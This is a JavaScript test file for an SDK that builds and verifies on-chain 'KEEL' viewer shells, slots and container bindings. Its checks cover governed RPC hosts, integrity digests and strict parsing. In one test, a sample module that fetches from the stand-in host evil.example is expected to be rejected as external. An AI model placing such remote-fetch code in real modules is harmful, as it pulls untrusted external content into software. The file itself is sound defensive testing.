import test from 'node:test';
import assert from 'node:assert/strict';
import {gzipSync} from 'node:zlib';
import {createHash} from 'node:crypto';
import {buildCompactInlineKeelShell,buildKeelOnchainContainerBinding,buildOnchainKeelViewerSlot,parseOnchainKeelViewerSlotFragment,resolveOnchainKeelViewerSlotBinding,validateOnchainContainerBindings} from '../packages/sdk/dist/verification-shell.js';
const store='0x'+'11'.repeat(20),objectId='0x'+'22'.repeat(32),builder='0x'+'33'.repeat(20),bytes=Buffer.from('const water="🌊";\nconst fire="🔥";'),storedBytes=gzipSync(bytes),sha=b=>'0x'+createHash('sha256').update(b).digest('hex');
const c={algorithm:'sha256',digest:sha(bytes),byteLength:bytes.length};
const delivery={chainId:31337,store,builder,storeCodeIntegrity:c,builderCodeIntegrity:c,rpcUrls:['http://127.0.0.1:8545'],rpcHosts:['127.0.0.1']};
const full={id:'water',role:'module',mediaType:'text/javascript',bytes,chainId:31337,store,objectId,compression:'gzip',storedBytes};
test('default embedded canonical shell bytes are retained for native and LZMA',async()=>{
 const expected={native:'0x9cc2cc2d865e513aad05de0392dd75f63297a3ad9b82964f9abe38a5f736d272','lzma-js':'0x522494e8a887ded1d0b10a8f03b0e3849c1adca1ef33f27f055aab34858dc253'};
 for(const codecProfile of ['native','lzma-js']){const a=await buildCompactInlineKeelShell({codecProfile});assert.equal(sha(a.prefix),'0xd9fb62d4b85337813dfd60cbd66a0d46601eccbff5f08d5ab566e816da429f31');assert.equal(sha(a.suffix),expected[codecProfile]);assert.equal(a.deliveryProfile,'embedded-assembled');}
});
test('binary profile uses same protected verifier and bounded reader with governed RPC',async()=>{
 const shell=await buildCompactInlineKeelShell({codecProfile:'lzma-js',onchainDelivery:delivery});assert.equal(shell.deliveryProfile,'onchain-recursive');assert.ok(shell.supportedCodecs.includes('lzma'));const text=Buffer.from(shell.suffix).toString();assert.ok(text.includes('KEEL binary object is not permanently registered and sealed.'));assert.ok(text.includes('Selected KEEL builder does not bind this Hold.'));assert.ok(text.includes('KEEL fallback RPC chain mismatch.'));assert.ok(text.includes('Unknown KEEL container reference.'));
 await assert.rejects(buildCompactInlineKeelShell({onchainDelivery:{...delivery,rpcHosts:[]}}),/governed/);
 await assert.rejects(buildCompactInlineKeelShell({onchainDelivery:{...delivery,chainId:1}}),/governed KEEL RPC/);
});
test('exact binary standalone slot contains descriptor only, no Base64 payload',async()=>{
 const slot=await buildOnchainKeelViewerSlot(full);const before=Buffer.from(storedBytes);slot.storedBytes.fill(0);assert.deepEqual(storedBytes,before,'returned bytes must not alias Node Buffer input');assert.equal(slot.fragment[0],44);assert.equal(slot.item.onchain.storedIntegrity.byteLength,storedBytes.length);assert.ok(!Buffer.from(slot.fragment).toString().includes('storedBase64'));assert.deepEqual(parseOnchainKeelViewerSlotFragment(slot.fragment),slot.item);
 await assert.rejects(buildOnchainKeelViewerSlot({...full,bytes:Buffer.from('wrong')}));
 const evil=Buffer.from('fetch("https://evil.example/file")');await assert.rejects(buildOnchainKeelViewerSlot({...full,bytes:evil,storedBytes:gzipSync(evil)}),/external/);
});
test('one immutable container table serves stable refs and future standalone fallback',async()=>{
 const binding=await buildKeelOnchainContainerBinding({chainId:31337,store,objectId,compression:'gzip',bytes,storedBytes});
 const member=bytes.subarray(0,10),slot=await buildOnchainKeelViewerSlot({...full,bytes:member,container:{bytes,memberOffset:0},containerReference:binding,containerBindings:[binding]});
 assert.equal(slot.item.onchain.containerId,binding.id);assert.equal(slot.item.store,undefined);const parsed=parseOnchainKeelViewerSlotFragment(slot.fragment),normal=resolveOnchainKeelViewerSlotBinding(parsed,[binding]);assert.equal(normal.store,store);assert.equal(normal.onchain.range.containerIntegrity.digest,sha(bytes));assert.equal(normal.integrity.digest,sha(member));assert.equal(normal.containerBindings,undefined);
 assert.throws(()=>resolveOnchainKeelViewerSlotBinding(parsed,[]),/Unknown/);assert.throws(()=>validateOnchainContainerBindings([binding,binding]),/Duplicate/);
 assert.throws(()=>resolveOnchainKeelViewerSlotBinding({...parsed,onchain:{...parsed.onchain,offset:bytes.length}},[binding]),/exceeds/);
 const fallback=await buildOnchainKeelViewerSlot({...full,id:'changed'});assert.deepEqual(resolveOnchainKeelViewerSlotBinding(fallback.item,[binding]),fallback.item);
});
test('parser rejects unknown fields, mixed refs, duplicate JSON keys and noncanonical bytes',async()=>{
 const {fragment,item}=await buildOnchainKeelViewerSlot(full),str=Buffer.from(fragment).toString();
 for(const bad of [str+' ',str.replace('"id":"water"','"id":"water","id":"water"'),str.replace('"id":"water"','"id":"water","unknown":1'),',null',',[]'])assert.throws(()=>parseOnchainKeelViewerSlotFragment(Buffer.from(bad)));
 assert.throws(()=>parseOnchainKeelViewerSlotFragment(new Uint8Array(65537)),/bounded/);
 const bad={...item,onchain:{containerId:objectId,offset:0,compression:'gzip'}};assert.throws(()=>resolveOnchainKeelViewerSlotBinding(bad,[]),/Unknown binary descriptor field/);
});
